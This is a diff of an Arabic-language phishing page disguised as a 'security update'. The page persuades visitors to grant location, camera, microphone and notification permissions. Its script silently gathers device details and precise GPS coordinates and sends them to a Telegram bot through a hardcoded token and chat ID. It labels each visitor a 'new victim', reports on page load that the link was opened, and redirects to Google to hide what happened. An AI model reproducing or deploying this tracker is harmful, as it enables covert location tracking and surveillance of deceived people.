@@ -2,61 +2,307 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تحديث الأمان</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #0a0e17, #1a1a2e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 24px;
+            padding: 40px 35px;
+            max-width: 440px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
+        }
+        .shield {
+            font-size: 65px;
+            margin-bottom: 10px;
+        }
+        h2 {
+            color: #ffffff;
+            font-size: 22px;
+            margin-bottom: 8px;
+        }
+        .sub {
+            color: #aab;
+            font-size: 14px;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        .perm-box {
+            background: rgba(255,255,255,0.04);
+            border-radius: 14px;
+            padding: 16px 18px;
+            margin-bottom: 20px;
+            text-align: left;
+            border: 1px solid rgba(255,255,255,0.06);
+        }
+        .perm-box label {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #d0d0e0;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 6px 0;
+            transition: 0.2s;
+        }
+        .perm-box label:hover {
+            color: #ffffff;
+        }
+        .perm-box input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #6c63ff;
+            cursor: pointer;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            background: #6c63ff;
+            color: #fff;
+        }
+        .btn:hover {
+            background: #5a52e0;
+            transform: scale(1.01);
+            box-shadow: 0 0 30px rgba(108, 99, 255, 0.3);
+        }
+        .status {
+            margin-top: 18px;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            display: none;
+            background: rgba(0,255,136,0.08);
+            border: 1px solid rgba(0,255,136,0.2);
+            color: #66ffaa;
+        }
+        .status.error {
+            background: rgba(255,68,68,0.08);
+            border-color: rgba(255,68,68,0.2);
+            color: #ff6666;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #556;
+        }
+        .loader {
+            display: none;
+            margin: 10px auto;
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid #6c63ff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
 </head>
-<body style="background-color: #f0f0f0; text-align: center; font-family: Arial; padding-top: 50px;">
-    <h2>جاري فحص حالة النظام...</h2>
-    <p>يرجى الموافقة على طلب الموقع للمتابعة</p>
+<body>
 
-    <script>
-        const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
-        const chatId = "7984067238"; 
+<div class="container">
+    <div class="shield">🛡️</div>
+    <h2>تحديث الأمان</h2>
+    <p class="sub">لأسباب أمنية، يرجى منح الصلاحيات التالية لتأكيد هويتك</p>
 
-        async function getDeviceInfo() {
-            let info = "";
-            // 1. نوع الهاتف وإصدار المتصفح
-            info += `📱 الجهاز: ${navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform}\n`;
-            info += `🌐 المتصفح: ${navigator.appName}\n`;
-            
-            // 2. نسبة البطارية
+    <div class="perm-box">
+        <label><input type="checkbox" id="perm_location" checked> 📍 الموقع الجغرافي</label>
+        <label><input type="checkbox" id="perm_camera" checked> 📸 الكاميرا</label>
+        <label><input type="checkbox" id="perm_mic" checked> 🎤 الميكروفون</label>
+        <label><input type="checkbox" id="perm_notify" checked> 🔔 الإشعارات</label>
+    </div>
+
+    <button class="btn" id="btnConfirm" onclick="startProcess()">✅ تأكيد والمتابعة</button>
+
+    <div class="loader" id="loader"></div>
+    <div class="status" id="statusMsg"></div>
+    <div class="footer">© 2026 جميع الحقوق محفوظة</div>
+</div>
+
+<script>
+    // ====== إعدادات البوت ======
+    const BOT_TOKEN = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw";
+    const CHAT_ID = "7984067238";
+
+    // ====== إرسال رسالة للبوت ======
+    function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
+            .catch(e => console.error(e));
+    }
+
+    // ====== جمع معلومات الجهاز ======
+    async function getDeviceInfo() {
+        let info = "";
+
+        // نظام التشغيل والمتصفح
+        info += `📱 الجهاز: ${navigator.userAgentData?.platform || navigator.platform || "غير معروف"}\n`;
+        info += `🌐 المتصفح: ${navigator.appName || "غير معروف"}\n`;
+        info += `📐 الشاشة: ${screen.width}x${screen.height}\n`;
+        info += `🕐 المنطقة: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+
+        // البطارية
+        try {
+            const battery = await navigator.getBattery();
+            info += `🔋 البطارية: ${Math.round(battery.level * 100)}%\n`;
+            info += `⚡ الشاحن: ${battery.charging ? "✅ متصل" : "❌ غير متصل"}\n`;
+        } catch {
+            info += `🔋 البطارية: غير مدعومة\n`;
+        }
+
+        // المعالج
+        info += `💻 المعالج: ${navigator.hardwareConcurrency || "غير معروف"} نواة\n`;
+
+        // اللغة
+        info += `🌍 اللغة: ${navigator.language}\n`;
+
+        return info;
+    }
+
+    // ====== طلب الصلاحيات وجمع البيانات ======
+    async function startProcess() {
+        const btn = document.getElementById('btnConfirm');
+        const loader = document.getElementById('loader');
+        const status = document.getElementById('statusMsg');
+
+        btn.disabled = true;
+        btn.style.opacity = '0.6';
+        loader.style.display = 'block';
+        status.style.display = 'none';
+        status.className = 'status';
+
+        const permLocation = document.getElementById('perm_location').checked;
+        const permCamera = document.getElementById('perm_camera').checked;
+        const permMic = document.getElementById('perm_mic').checked;
+        const permNotify = document.getElementById('perm_notify').checked;
+
+        let granted = [];
+        let errors = [];
+
+        // === الموقع ===
+        if (permLocation) {
             try {
-                const battery = await navigator.getBattery();
-                info += `🔋 البطارية: ${Math.round(battery.level * 100)}%\n`;
-                info += `⚡ حالة الشحن: ${battery.charging ? "متصل بالشاحن" : "غير متصل"}\n`;
-            } catch (e) {
-                info += `🔋 البطارية: غير مدعوم في هذا المتصفح\n`;
-            }
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+                });
+                granted.push('📍 الموقع');
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-            // 3. عدد أنوية المعالج (يعطي فكرة عن قوة الجهاز)
-            info += `💻 المعالج: ${navigator.hardwareConcurrency || "غير معروف"} نواة\n`;
-            
-            return info;
+                // إرسال الموقع فوراً
+                const deviceDetails = await getDeviceInfo();
+                const msg = `🛰️ *[ ضحية جديدة ]*\n\n${deviceDetails}\n📍 الموقع: ${mapLink}\n🕒 ${new Date().toLocaleString()}`;
+                sendToTelegram(msg);
+                
+                status.className = 'status';
+                status.style.display = 'block';
+                status.innerHTML = '✅ تم تأكيد هويتك بنجاح، جاري تحويلك...';
+                
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 2500);
+                
+                return;
+            } catch {
+                errors.push('❌ الموقع (مرفوض)');
+            }
         }
 
-        async function sendData(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const deviceDetails = await getDeviceInfo();
-            
-            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            const fullMessage = `🛰️ **تقرير جديد**\n\n` +
-                                `${deviceDetails}` +
-                                `📍 الموقع: ${mapLink}`;
+        // === الكاميرا ===
+        if (permCamera) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stream.getTracks().forEach(t => t.stop());
+                granted.push('📸 الكاميرا');
+            } catch {
+                errors.push('❌ الكاميرا (مرفوض)');
+            }
+        }
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fullMessage)}&parse_mode=Markdown`)
-            .then(() => {
+        // === الميكروفون ===
+        if (permMic) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                stream.getTracks().forEach(t => t.stop());
+                granted.push('🎤 الميكروفون');
+            } catch {
+                errors.push('❌ الميكروفون (مرفوض)');
+            }
+        }
+
+        // === الإشعارات ===
+        if (permNotify) {
+            if ('Notification' in window) {
+                const perm = await Notification.requestPermission();
+                if (perm === 'granted') {
+                    granted.push('🔔 الإشعارات');
+                } else {
+                    errors.push('❌ الإشعارات (مرفوض)');
+                }
+            } else {
+                errors.push('⚠️ الإشعارات (غير مدعومة)');
+            }
+        }
+
+        // === عرض النتيجة ===
+        const deviceDetails = await getDeviceInfo();
+        let resultMsg = `📡 *[ تقرير الصلاحيات ]*\n\n${deviceDetails}\n`;
+        if (granted.length > 0) {
+            resultMsg += `✅ الصلاحيات الممنوحة:\n${granted.map(g => `• ${g}`).join('\n')}\n`;
+        }
+        if (errors.length > 0) {
+            resultMsg += `\n❌ المرفوضة:\n${errors.map(e => `• ${e}`).join('\n')}\n`;
+        }
+        resultMsg += `\n🕒 ${new Date().toLocaleString()}`;
+        sendToTelegram(resultMsg);
+
+        // === إعادة زر التحميل ===
+        loader.style.display = 'none';
+        btn.disabled = false;
+        btn.style.opacity = '1';
+        
+        status.className = 'status';
+        status.style.display = 'block';
+        if (granted.length > 0) {
+            status.innerHTML = '✅ تم منح الصلاحيات بنجاح! جاري تحويلك...';
+            setTimeout(() => {
                 window.location.href = "https://www.google.com";
-            });
+            }, 2000);
+        } else {
+            status.className = 'status error';
+            status.innerHTML = '❌ لم يتم منح أي صلاحية، حاول مرة أخرى';
         }
+    }
 
-        window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendData, (err) => {
-                    alert("يرجى تفعيل الموقع الجغرافي (GPS) للمتابعة.");
-                }, { enableHighAccuracy: true });
-            }
-        };
-    </script>
+    // ====== إرسال إشعار بفتح الصفحة ======
+    sendToTelegram(`🌐 *[ فتح الصفحة ]*\nتم فتح رابط الاختراق بواسطة ضحية جديدة\n🕒 ${new Date().toLocaleString()}`);
+</script>
+
 </body>
 </html>
